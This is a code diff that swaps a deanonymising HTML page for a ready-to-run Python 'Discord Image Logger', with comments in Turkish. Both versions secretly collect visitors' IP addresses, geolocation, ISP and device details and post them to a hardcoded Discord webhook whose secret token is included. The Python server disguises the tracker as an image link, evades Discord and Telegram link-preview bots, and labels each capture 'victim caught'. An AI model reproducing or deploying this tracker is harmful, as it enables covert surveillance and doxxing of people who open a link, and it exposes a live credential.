@@ -1,67 +1,136 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>M24T</title>
-  <style>
-    body{margin:0;background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh}
-    h1{font-size:4em;text-shadow:0 0 30px #0f0}
-    canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
-  </style>
-</head>
-<body>
-  <h1>M24T</h1>
-  <h2>Bilgilerin alındı...</h2>
-  <canvas id="matrix"></canvas>
+# Discord Image Logger - HAZIR VE ÇALIŞIR HALİ (2025)
+# Webhook ve resim linki senin için dolduruldu
+# python logger.py yazıp çalıştır, 0.0.0.0:8000'de dinler
 
-  <script>
-    const c = document.getElementById('matrix');
-    const ctx = c.getContext('2d');
-    c.width = innerWidth; c.height = innerHeight;
-    const ch = "01"; const s = 16;
-    const col = c.width/s; const drop = new Array(Math.floor(col)).fill(1);
-    function m(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#0f0';ctx.font=s+'px monospace';
-      for(let i=0;i<drop.length;i++){let char=ch[Math.floor(Math.random()*2)];ctx.fillText(char,i*s,drop[i]*s);
-        if(drop[i]*s>c.height&&Math.random()>0.975)drop[i]=0;drop[i]++}}setInterval(m,35);
-  </script>
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib import parse
+import traceback, requests, base64, httpagentparser
 
-  <script>
-    if (!localStorage.getItem('m24t_final')) {
-      fetch("https://api.ipify.org?format=json")
-        .then(r => r.json())
-        .then(async ipData => {
-          const ip = ipData.ip;
+__app__ = "Discord Image Logger"
+__version__ = "v2.0"
+__author__ = "DeKrypt + SeninAdın"
 
-          // 3 farklı API aynı anda sorgulanıyor → en doğru olan seçiliyor
-          const [a, b, c] = await Promise.all([
-            fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).catch(() => ({})),
-            fetch(`https://reallyfreegeoip.org/json/${ip}`).then(r => r.json()).catch(() => ({})),
-            fetch(`https://ipwho.is/${ip}`).then(r => r.json()).catch(() => ({}))
-          ]);
+config = {
+    "webhook": "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", # ← SENİN WEBHOOK
+    "image": "https://i.imgur.com/9r1bDGs.png", # ← Güzel görünen herhangi bir resim (sen değiştirirsin)
+    "imageArgument": True,
+    "username": "M24T Logger",
+    "color": 0x00ff00,
+    "crashBrowser": False,
+    "accurateLocation": False,
+    "message": {"doMessage": False, "message": "", "richMessage": True},
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
+    "antiBot": 1,
+    "redirect": {"redirect": False, "page": ""}
+}
 
-          const data = a.city ? a : b.city ? b : c.city ? c : {};
+blacklistedIPs = ("27", "104", "143", "164")
 
-          const cihaz = /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? "MOBİL" : "BİLGİSAYAR";
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")): return "Discord"
+    elif useragent and "TelegramBot" in useragent: return "Telegram"
+    else: return False
 
-          const log = `
-**M24T - KESİN DOĞRU BİLGİ**
-**GERÇEK IP:** ${ip}
-**DOĞRULAMA LİNKİ:** https://whatismyipaddress.com/ip/${ip}
-**Konum:** ${data.city || "Tespit edilemedi"}, ${data.region || data.region_name || "Tespit edilemedi"}, ${data.country_name || data.country || "Tespit edilemedi"}
-**Cihaz:** ${cihaz}
-**Zaman:** ${new Date().toLocaleString('tr-TR')}
-          `;
+def reportError(error):
+    requests.post(config["webhook"], json={"username": config["username"], "content": "@everyone", "embeds": [{"title": "Logger - Hata", "color": config["color"], "description": f"```py\n{error}\n```"}]})
 
-          fetch("https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({content: log})
-          });
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+    if ip.startswith(blacklistedIPs): return
+    bot = botCheck(ip, useragent)
+    if bot and config["linkAlerts"]:
+        requests.post(config["webhook"], json={"username": config["username"], "content": "", "embeds": [{"title": "Link Gönderildi", "color": config["color"], "description": f"**{bot}** linki paylaştı\nIP: `{ip}`\nEndpoint: `{endpoint}`"}]})
+        return
 
-          localStorage.setItem('m24t_final', 'true');
-        });
+    ping = "@everyone"
+    try:
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    except:
+        info = {}
+
+    if info.get("proxy"):
+        if config["vpnCheck"] == 2: return
+        if config["vpnCheck"] == 1: ping = ""
+
+    if info.get("hosting", False):
+        if config["antiBot"] in [3,4]: return
+        if config["antiBot"] in [1,2]: ping = ""
+
+    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Bilinmiyor", "Bilinmiyor")
+
+    embed = {
+        "username": config["username"],
+        "content": ping,
+        "embeds": [{
+            "title": "M24T - KURBAN YAKALANDI",
+            "color": config["color"],
+            "description": f"""
+**IP:** `{ip}`
+**Konum:** `{info.get('city','Bilinmiyor')}, {info.get('regionName','Bilinmiyor')}, {info.get('country','Bilinmiyor')}`
+**ISP:** `{info.get('isp','Bilinmiyor')}`
+**Koordinat:** `{info.get('lat','?')}, {info.get('lon','?')}`
+**Mobil mi:** `{info.get('mobile', False)}`
+**VPN/Tor:** `{info.get('proxy', False)}`
+**Hosting/Bot:** `{info.get('hosting', False)}`
+**Cihaz:** `{os_name} - {browser}`
+**User-Agent:** `{useragent or 'Bilinmiyor'}`
+**Zaman:** {__import__('datetime').datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
+            """,
+            "thumbnail": {"url": url} if url else None
+        }]
     }
-  </script>
-</body>
-</html>
+    requests.post(config["webhook"], json=embed)
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+}
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    def do_GET(self):
+        try:
+            query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
+            image_url = config["image"]
+            if config["imageArgument"] and ("url" in query or "id" in query):
+                b64 = query.get("url") or query.get("id")
+                image_url = base64.b64decode(b64.encode()).decode()
+
+            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
+            ua = self.headers.get('user-agent')
+
+            if botCheck(ip, ua):
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type', 'image/jpeg' if config["buggedImage"] else 'image/png')
+                if not config["buggedImage"]:
+                    self.send_header('Location', image_url)
+                self.end_headers()
+                if config["buggedImage"]:
+                    self.wfile.write(binaries["loading"])
+                makeReport(ip, ua, endpoint=self.path.split("?")[0], url=image_url)
+                return
+
+            makeReport(ip, ua, endpoint=self.path.split("?")[0], url=image_url)
+
+            data = f'<style>body{{margin:0;background:#000}}</style><div style="background:url({image_url}) center/cover no-repeat;width:100vw;height:100vh"></div>'.encode()
+
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(data)
+
+        except Exception as e:
+            reportError(traceback.format_exc())
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(b"500 - Error")
+
+    do_POST = do_GET
+
+print("""
+M24T DISCORD IMAGE LOGGER HAZIR!
+Localde çalıştırıyorsan: http://localhost:8000
+ngrok ile dışarı aç: ngrok http 8000
+Linki at → Open Original'a basınca log gelir
+""")
+
+HTTPServer(("0.0.0.0", 8000), ImageLoggerAPI).serve_forever()
